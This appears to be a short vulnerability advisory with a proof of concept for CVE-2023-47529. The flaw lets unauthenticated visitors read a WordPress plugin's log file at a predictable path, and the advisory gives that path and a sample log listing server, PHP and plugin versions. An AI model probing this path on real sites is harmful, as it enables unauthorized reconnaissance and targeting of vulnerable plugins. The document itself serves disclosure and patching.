# CVE-2023-47529
Cloud Templates &amp; Patterns collection &lt;= 1.2.2 - Sensitive Information Exposure via Log File

```
Description:
The Cloud Templates & Patterns collection plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 1.2.2 via a log file with a predictable name. This makes it possible for unauthenticated attackers to extract sensitive data.
Severity: medium
CVE ID: CVE-2023-47529
CVSS Score: 5.3
CVSS Metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Plugin Slug: templates-patterns-collection
WPScan URL: https://www.wpscan.com/plugin/templates-patterns-collection
Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/c59baad8-b888-4475-8371-645811a6b569
```

POC
---

`/wp-content/uploads/ti_theme_onboarding.log`

```
[16/Jan/2022:19:09:48] (I): WordPress Instance Info:
[16/Jan/2022:19:09:48] (I): Home URL : http://localhost/wordpress
[16/Jan/2022:19:09:48] (I): Site URL : http://localhost/wordpress
[16/Jan/2022:19:09:48] (I): WordPress Version : 5.8.3
[16/Jan/2022:19:09:48] (I): Onboarding Version : 1.1.20
[16/Jan/2022:19:09:48] (I): Multisite : No
[16/Jan/2022:19:09:48] (I): Server Info : Apache/2.4.51 (Win64) PHP/7.4.26
[16/Jan/2022:19:09:48] (I): PHP Version : 7.4.26
[16/Jan/2022:19:09:48] (I): HTTPS : No
[16/Jan/2022:19:09:48] (I): PHP Max Execution Time : 120
[16/Jan/2022:19:09:48] (I): PHP Max Input Vars : 2500
[16/Jan/2022:19:09:48] (I): Max Upload Size : 2097152
[16/Jan/2022:19:09:48] (I): Plugins:
[16/Jan/2022:19:09:48] (I): [PLUGIN] Memberlite Elements : v1.0.5 (Stranger Studios)
[16/Jan/2022:19:09:48] (I): [PLUGIN] Simply Schedule Appointments : v1.5.2.1 (N squared)
[16/Jan/2022:19:09:48] (I): [PLUGIN] Templates Patterns Collection : v1.1.20 (ThemeIsle)
[16/Jan/2022:19:09:48] (I): [PLUGIN] User Notes : v1.0.2 (Cartpauj)
[16/Jan/2022:19:09:48] (I): [PLUGIN] WooCommerce : v6.1.0 (Automattic)
[16/Jan/2022:19:09:48] (I): [PLUGIN] 3CX Live Chat : v9.4.1 (3CX)
[16/Jan/2022:19:09:48] (I): [PLUGIN] WPForms Lite : v1.7.2 (WPForms)
[16/Jan/2022:19:09:48] (I): [PLUGIN] Jetpack CRM : v4.7.0 (Automattic)
```
